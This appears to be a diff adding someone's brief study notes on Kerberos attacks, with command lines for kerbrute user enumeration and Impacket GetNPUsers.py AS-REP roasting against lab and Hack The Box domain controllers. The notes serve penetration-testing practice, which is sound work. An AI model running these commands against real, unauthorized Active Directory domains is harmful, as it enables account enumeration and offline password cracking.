@@ -1,0 +1,14 @@
+Kerberos 
+
+1- use tool like kerbrute to enumrate users 
+   because kerberose if the name is true will return a true flag 
+   use it like 
+   sudo ./kerbrute_linux_amd64 userenum --dc 192.168.56.56 -d mat.sy user<wordlist>
+2- use impacket script 
+    GetNPUsers.py to get users with no ticket login 
+    like 
+      python3 GetNPUsers.py mat.sy/'haidar(name of user)' -dc-ip 192.168.56.56
+    
+    or without specify the user like this (but not likely ocurre)
+      python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+
